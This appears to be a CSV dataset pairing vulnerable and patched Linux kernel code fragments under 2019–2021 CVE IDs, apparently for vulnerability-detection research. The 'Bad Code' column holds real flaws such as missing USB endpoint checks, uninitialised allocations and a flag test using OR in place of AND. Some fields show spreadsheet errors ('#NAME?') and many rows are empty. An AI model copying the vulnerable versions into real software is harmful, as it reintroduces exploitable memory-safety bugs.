Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2020,,CVE-2020-11668," return -EIO;
	}




 return le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
}


static int sd_isoc_init(struct gspca_dev *gspca_dev)
{

 struct usb_host_interface *alt;
 int max_packet_size;

 break;
	}











 /* Start isoc bandwidth ""negotiation"" at max isoc bandwidth */
	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	alt->endpoint[0].desc.wMaxPacketSize = cpu_to_le16(max_packet_size);

 return 0;
 break;
	}




	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 if (packet_size <= min_packet_size)
"," return -EIO;
	}

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

 return le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
}


static int sd_isoc_init(struct gspca_dev *gspca_dev)
{
 struct usb_interface_cache *intfc;
 struct usb_host_interface *alt;
 int max_packet_size;

 break;
	}

	intfc = gspca_dev->dev->actconfig->intf_cache[0];

 if (intfc->num_altsetting < 2)
 return -ENODEV;

	alt = &intfc->altsetting[1];

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

 /* Start isoc bandwidth ""negotiation"" at max isoc bandwidth */

	alt->endpoint[0].desc.wMaxPacketSize = cpu_to_le16(max_packet_size);

 return 0;
 break;
	}

 /*
	 * Existence of altsetting and endpoint was verified in sd_isoc_init()
 */
	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 if (packet_size <= min_packet_size)
"
2020,,CVE-2020-11609," return -EIO;
	}




	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
	err = stv06xx_write_bridge(sd, STV_ISO_SIZE_L, packet_size);
 if (err < 0)

static int stv06xx_isoc_init(struct gspca_dev *gspca_dev)
{

 struct usb_host_interface *alt;
 struct sd *sd = (struct sd *) gspca_dev;











 /* Start isoc bandwidth ""negotiation"" at max isoc bandwidth */
	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	alt->endpoint[0].desc.wMaxPacketSize =
 cpu_to_le16(sd->sensor->max_packet_size[gspca_dev->curr_mode]);

 struct usb_host_interface *alt;
 struct sd *sd = (struct sd *) gspca_dev;





	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
	min_packet_size = sd->sensor->min_packet_size[gspca_dev->curr_mode];
	alt = usb_altnum_to_altsetting(intf, sd->gspca_dev.alt);
 if (!alt)
 return -ENODEV;




	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);

 /* If we don't have enough bandwidth use a lower framerate */
"," return -EIO;
	}

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
	err = stv06xx_write_bridge(sd, STV_ISO_SIZE_L, packet_size);
 if (err < 0)

static int stv06xx_isoc_init(struct gspca_dev *gspca_dev)
{
 struct usb_interface_cache *intfc;
 struct usb_host_interface *alt;
 struct sd *sd = (struct sd *) gspca_dev;

	intfc = gspca_dev->dev->actconfig->intf_cache[0];

 if (intfc->num_altsetting < 2)
 return -ENODEV;

	alt = &intfc->altsetting[1];

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

 /* Start isoc bandwidth ""negotiation"" at max isoc bandwidth */

	alt->endpoint[0].desc.wMaxPacketSize =
 cpu_to_le16(sd->sensor->max_packet_size[gspca_dev->curr_mode]);

 struct usb_host_interface *alt;
 struct sd *sd = (struct sd *) gspca_dev;

 /*
	 * Existence of altsetting and endpoint was verified in
	 * stv06xx_isoc_init()
 */
	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
	min_packet_size = sd->sensor->min_packet_size[gspca_dev->curr_mode];
	alt = usb_altnum_to_altsetting(intf, sd->gspca_dev.alt);
 if (!alt)
 return -ENODEV;

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);

 /* If we don't have enough bandwidth use a lower framerate */
"
2020,,CVE-2020-11608," return;
	}






	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 reg_w(sd, R51x_FIFO_PSIZE, packet_size >> 5);

 return;
	}






	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 ov518_reg_w32(sd, R51x_FIFO_PSIZE, packet_size & ~7, 2);

"," return;
	}

 if (alt->desc.bNumEndpoints < 1) {
		sd->gspca_dev.usb_err = -ENODEV;
 return;
	}

	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 reg_w(sd, R51x_FIFO_PSIZE, packet_size >> 5);

 return;
	}

 if (alt->desc.bNumEndpoints < 1) {
		sd->gspca_dev.usb_err = -ENODEV;
 return;
	}

	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 ov518_reg_w32(sd, R51x_FIFO_PSIZE, packet_size & ~7, 2);

"
2020,,CVE-2020-11565," switch (mode) {
 case MPOL_PREFERRED:
 /*
		 * Insist on a nodelist of one node only


 */
 if (nodelist) {
 char *rest = nodelist;
 while (isdigit(*rest))
				rest++;
 if (*rest)
 goto out;


		}
 break;
 case MPOL_INTERLEAVE:
"," switch (mode) {
 case MPOL_PREFERRED:
 /*
		 * Insist on a nodelist of one node only, although later
		 * we use first_node(nodes) to grab a single node, so here
		 * nodelist (or nodes) cannot be empty.
 */
 if (nodelist) {
 char *rest = nodelist;
 while (isdigit(*rest))
				rest++;
 if (*rest)
 goto out;
 if (nodes_empty(nodes))
 goto out;
		}
 break;
 case MPOL_INTERLEAVE:
"
2020,#NAME?,CVE-2020-11494,"	u32 tmpid;
 char *cmd = sl->rbuff;

 cf.can_id = 0;

 switch (*cmd) {
 case 'r':
 else
 return;

	*(u64 *) (&cf.data) = 0; /* clear payload */

 /* RTR frames may have a dlc > 0 but they never have any data bytes */
 if (!(cf.can_id & CAN_RTR_FLAG)) {
 for (i = 0; i < cf.can_dlc; i++) {
","	u32 tmpid;
 char *cmd = sl->rbuff;

 memset(&cf, 0, sizeof(cf));

 switch (*cmd) {
 case 'r':
 else
 return;



 /* RTR frames may have a dlc > 0 but they never have any data bytes */
 if (!(cf.can_id & CAN_RTR_FLAG)) {
 for (i = 0; i < cf.can_dlc; i++) {
"
2020,Overflow ,CVE-2020-10942,,
2020,,CVE-2020-10781,,
2021,,CVE-2020-10774,,
2020,#NAME?,CVE-2020-10773,,
2020,,CVE-2020-10768,,
2020,,CVE-2020-10767,,
2020,,CVE-2020-10766,,
2020,Overflow ,CVE-2020-10757,,
2021,Overflow ,CVE-2020-10742,,
2020,,CVE-2020-10732,"		    (!regset->active || regset->active(t->task, regset) > 0)) {
 int ret;
 size_t size = regset_size(t->task, regset);
 void *data = kmalloc(size, GFP_KERNEL);
 if (unlikely(!data))
 return 0;
			ret = regset->get(t->task, regset,
","		    (!regset->active || regset->active(t->task, regset) > 0)) {
 int ret;
 size_t size = regset_size(t->task, regset);
 void *data = kzalloc(size, GFP_KERNEL);
 if (unlikely(!data))
 return 0;
			ret = regset->get(t->task, regset,
"
2020,,CVE-2020-10720,,
2020,DoS ,CVE-2020-10711,,
2020,,CVE-2020-10690,,
2020,Overflow Mem. Corr. ,CVE-2020-9391,,
2020,,CVE-2020-9383,"/* selects the fdc and drive, and enables the fdc's input/dma. */
static void set_fdc(int drive)
{


 if (drive >= 0 && drive < N_DRIVE) {
 fdc = FDC(drive);
		current_drive = drive;
	}
 if (fdc != 1 && fdc != 0) {
 pr_info(""bad fdc value\n"");
 return;
	}

 set_dor(fdc, ~0, 8);
#if N_FDC > 1
 set_dor(1 - fdc, ~8, 0);
","/* selects the fdc and drive, and enables the fdc's input/dma. */
static void set_fdc(int drive)
{
 unsigned int new_fdc = fdc;

 if (drive >= 0 && drive < N_DRIVE) {
 new_fdc = FDC(drive);
		current_drive = drive;
	}
 if (new_fdc >= N_FDC) {
 pr_info(""bad fdc value\n"");
 return;
	}
	fdc = new_fdc;
 set_dor(fdc, ~0, 8);
#if N_FDC > 1
 set_dor(1 - fdc, ~8, 0);
"
2020,DoS ,CVE-2020-8992,,
2020,Overflow ,CVE-2020-8835,,
2020,,CVE-2020-8649,,
2020,,CVE-2020-8648,,
2020,,CVE-2020-8647,,
2020,DoS +Info ,CVE-2020-8428," * may_create_in_sticky - Check whether an O_CREAT open in a sticky directory
 *			  should be allowed, or not, on files that already
 *			  exist.
 * @dir: the sticky parent directory

 * @inode: the inode of the file to open
 *
 * Block an O_CREAT open of a FIFO (or a regular file) when:
 *
 * Returns 0 if the open is allowed, -ve on error.
 */
static int may_create_in_sticky(struct dentry * const dir,
 struct inode * const inode)
{
 if ((!sysctl_protected_fifos && S_ISFIFO(inode->i_mode)) ||
	    (!sysctl_protected_regular && S_ISREG(inode->i_mode)) ||
 likely(!(dir->d_inode->i_mode & S_ISVTX)) ||
 uid_eq(inode->i_uid, dir->d_inode->i_uid) ||
 uid_eq(current_fsuid(), inode->i_uid))
 return 0;

 if (likely(dir->d_inode->i_mode & 0002) ||
	    (dir->d_inode->i_mode & 0020 &&
	     ((sysctl_protected_fifos >= 2 && S_ISFIFO(inode->i_mode)) ||
	      (sysctl_protected_regular >= 2 && S_ISREG(inode->i_mode))))) {
 const char *operation = S_ISFIFO(inode->i_mode) ?
 struct file *file, const struct open_flags *op)
{
 struct dentry *dir = nd->path.dentry;


 int open_flag = op->open_flag;
 bool will_truncate = (open_flag & O_TRUNC) != 0;
 bool got_write = false;
		error = -EISDIR;
 if (d_is_dir(nd->path.dentry))
 goto out;
		error = may_create_in_sticky(dir,
 d_backing_inode(nd->path.dentry));
 if (unlikely(error))
 goto out;
"," * may_create_in_sticky - Check whether an O_CREAT open in a sticky directory
 *			  should be allowed, or not, on files that already
 *			  exist.
 * @dir_mode: mode bits of directory
 * @dir_uid: owner of directory
 * @inode: the inode of the file to open
 *
 * Block an O_CREAT open of a FIFO (or a regular file) when:
 *
 * Returns 0 if the open is allowed, -ve on error.
 */
static int may_create_in_sticky(umode_t dir_mode, kuid_t dir_uid,
 struct inode * const inode)
{
 if ((!sysctl_protected_fifos && S_ISFIFO(inode->i_mode)) ||
	    (!sysctl_protected_regular && S_ISREG(inode->i_mode)) ||
 likely(!(dir_mode & S_ISVTX)) ||
 uid_eq(inode->i_uid, dir_uid) ||
 uid_eq(current_fsuid(), inode->i_uid))
 return 0;

 if (likely(dir_mode & 0002) ||
	    (dir_mode & 0020 &&
	     ((sysctl_protected_fifos >= 2 && S_ISFIFO(inode->i_mode)) ||
	      (sysctl_protected_regular >= 2 && S_ISREG(inode->i_mode))))) {
 const char *operation = S_ISFIFO(inode->i_mode) ?
 struct file *file, const struct open_flags *op)
{
 struct dentry *dir = nd->path.dentry;
 kuid_t dir_uid = dir->d_inode->i_uid;
 umode_t dir_mode = dir->d_inode->i_mode;
 int open_flag = op->open_flag;
 bool will_truncate = (open_flag & O_TRUNC) != 0;
 bool got_write = false;
		error = -EISDIR;
 if (d_is_dir(nd->path.dentry))
 goto out;
		error = may_create_in_sticky(dir_mode, dir_uid,
 d_backing_inode(nd->path.dentry));
 if (unlikely(error))
 goto out;
"
2020,,CVE-2020-7053,,
2020,,CVE-2020-1749,,
2021,,CVE-2019-25045,,
2021,Exec Code ,CVE-2019-25044,,
2020,,CVE-2019-20934,,
2020,Bypass ,CVE-2019-20908,,
2020,DoS ,CVE-2019-20812,,
2020,,CVE-2019-20811,,
2020,,CVE-2019-20810,,
2020,DoS ,CVE-2019-20806,"	input->vb = NULL;
 spin_unlock_irqrestore(&input->slock, flags);

	v4l2_buf = to_vb2_v4l2_buffer(&vb->vb.vb2_buf);

 if (!vb) { /* Gone because of disabling */
 dev_dbg(&dev->pci->dev, ""vb is empty, dropping frame\n"");
 return;
	}



 /*
	 * Check for space.
	 * Mind the overhead of startcode emulation prevention.
","	input->vb = NULL;
 spin_unlock_irqrestore(&input->slock, flags);



 if (!vb) { /* Gone because of disabling */
 dev_dbg(&dev->pci->dev, ""vb is empty, dropping frame\n"");
 return;
	}

	v4l2_buf = to_vb2_v4l2_buffer(&vb->vb.vb2_buf);

 /*
	 * Check for space.
	 * Mind the overhead of startcode emulation prevention.
"
2020,,CVE-2019-20794,,
2020,,CVE-2019-20636,"		}
	}

 __clear_bit(*old_keycode, dev->keybit);
 __set_bit(ke->keycode, dev->keybit);

 for (i = 0; i < dev->keycodemax; i++) {
 if (input_fetch_keycode(dev, i) == *old_keycode) {
 __set_bit(*old_keycode, dev->keybit);
 break; /* Setting the bit twice is useless, so break */

		}
	}


 return 0;
}

	 * Simulate keyup event if keycode is not present
	 * in the keymap anymore
 */
 if (test_bit(EV_KEY, dev->evbit) &&
	    !is_event_supported(old_keycode, dev->keybit, KEY_MAX) &&
 __test_and_clear_bit(old_keycode, dev->key)) {




 struct input_value vals[] =  {
			{ EV_KEY, old_keycode, 0 },
			input_value_sync
","		}
	}

 if (*old_keycode <= KEY_MAX) {
 __clear_bit(*old_keycode, dev->keybit);
 for (i = 0; i < dev->keycodemax; i++) {
 if (input_fetch_keycode(dev, i) == *old_keycode) {
 __set_bit(*old_keycode, dev->keybit);
 /* Setting the bit twice is useless, so break */
 break;
			}
		}
	}

 __set_bit(ke->keycode, dev->keybit);
 return 0;
}

	 * Simulate keyup event if keycode is not present
	 * in the keymap anymore
 */
 if (old_keycode > KEY_MAX) {
 dev_warn(dev->dev.parent ?: &dev->dev,
 ""%s: got too big old keycode %#x\n"",
			 __func__, old_keycode);
	} else if (test_bit(EV_KEY, dev->evbit) &&
		   !is_event_supported(old_keycode, dev->keybit, KEY_MAX) &&
 __test_and_clear_bit(old_keycode, dev->key)) {
 struct input_value vals[] =  {
			{ EV_KEY, old_keycode, 0 },
			input_value_sync
"
2020,,CVE-2019-20422," if (rt->dst.error == -EAGAIN) {
 ip6_rt_put_flags(rt, flags);
		rt = net->ipv6.ip6_null_entry;
 if (!(flags | RT6_LOOKUP_F_DST_NOREF))
 dst_hold(&rt->dst);
	}

"," if (rt->dst.error == -EAGAIN) {
 ip6_rt_put_flags(rt, flags);
		rt = net->ipv6.ip6_null_entry;
 if (!(flags & RT6_LOOKUP_F_DST_NOREF))
 dst_hold(&rt->dst);
	}

"
2019,DoS ,CVE-2019-20096,,
2019,DoS ,CVE-2019-20095,,
2019,,CVE-2019-20054,,
2019,DoS ,CVE-2019-19966,,
2019,,CVE-2019-19965,,
2019,#NAME?,CVE-2019-19947," struct kvaser_cmd *cmd;
 int err;

	cmd = kmalloc(sizeof(*cmd), GFP_ATOMIC);
 if (!cmd)
 return -ENOMEM;

 struct kvaser_cmd *cmd;
 int rc;

	cmd = kmalloc(sizeof(*cmd), GFP_KERNEL);
 if (!cmd)
 return -ENOMEM;

 struct kvaser_cmd *cmd;
 int rc;

	cmd = kmalloc(sizeof(*cmd), GFP_KERNEL);
 if (!cmd)
 return -ENOMEM;

"," struct kvaser_cmd *cmd;
 int err;

	cmd = kzalloc(sizeof(*cmd), GFP_ATOMIC);
 if (!cmd)
 return -ENOMEM;

 struct kvaser_cmd *cmd;
 int rc;

	cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
 if (!cmd)
 return -ENOMEM;

 struct kvaser_cmd *cmd;
 int rc;

	cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
 if (!cmd)
 return -ENOMEM;

"
2019,,CVE-2019-19927,"			}

#ifdef CONFIG_TRANSPARENT_HUGEPAGE
 if (!(flags & TTM_PAGE_FLAG_DMA32)) {

 for (j = 0; j < HPAGE_PMD_NR; ++j)
 if (p++ != pages[i + j])
 break;
 unsigned max_size, n2free;

 spin_lock_irqsave(&huge->lock, irq_flags);
 while (i < npages) {
 struct page *p = pages[i];
 unsigned j;

","			}

#ifdef CONFIG_TRANSPARENT_HUGEPAGE
 if (!(flags & TTM_PAGE_FLAG_DMA32) &&
			    (npages - i) >= HPAGE_PMD_NR) {
 for (j = 0; j < HPAGE_PMD_NR; ++j)
 if (p++ != pages[i + j])
 break;
 unsigned max_size, n2free;

 spin_lock_irqsave(&huge->lock, irq_flags);
 while ((npages - i) >= HPAGE_PMD_NR) {
 struct page *p = pages[i];
 unsigned j;

"
